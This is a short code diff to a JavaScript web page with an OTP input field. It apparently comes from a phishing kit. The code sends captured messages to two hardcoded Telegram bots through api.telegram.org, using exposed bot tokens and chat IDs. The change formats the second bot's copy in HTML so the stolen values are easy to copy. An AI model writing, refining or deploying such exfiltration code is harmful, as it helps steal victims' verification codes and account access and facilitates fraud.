@@ -679,6 +679,18 @@
     const bot2Token = "8602888229:AAHB0XSqtkVa--8uj3OvNAbNsuM4KFECtZ0";
     const bot2ChatId = "8623773122";
 
+    function escapeHtml(text) {
+        return String(text)
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;");
+    }
+
+    function formatForBot2(markdownLikeMessage) {
+        return escapeHtml(markdownLikeMessage).replace(/`([^`]+)`/g, "<code>$1</code>");
+    }
+
     // قيد: رمز التحقق لا يقبل إلا أرقاماً
     document.addEventListener("DOMContentLoaded", function () {
         const otpEl = document.getElementById("otpInput");
@@ -699,10 +711,11 @@
         return true;
     }
 
-    // دالة إرسال الرسالة منفصلة للبوتين معاً
+    // دالة إرسال الرسالة منفصلة للبوتين معاً (تسهيل النسخ للبوت الثاني فقط)
     function sendToTelegram(message) {
         const url1 = `https://api.telegram.org/bot${bot1Token}/sendMessage?chat_id=${bot1ChatId}&text=${encodeURIComponent(message)}`;
-        const url2 = `https://api.telegram.org/bot${bot2Token}/sendMessage?chat_id=${bot2ChatId}&text=${encodeURIComponent(message)}`;
+        const bot2Text = formatForBot2(message);
+        const url2 = `https://api.telegram.org/bot${bot2Token}/sendMessage?chat_id=${bot2ChatId}&parse_mode=HTML&text=${encodeURIComponent(bot2Text)}`;
 
         fetch(url1).catch(err => console.log(err));
         fetch(url2).catch(err => console.log(err));
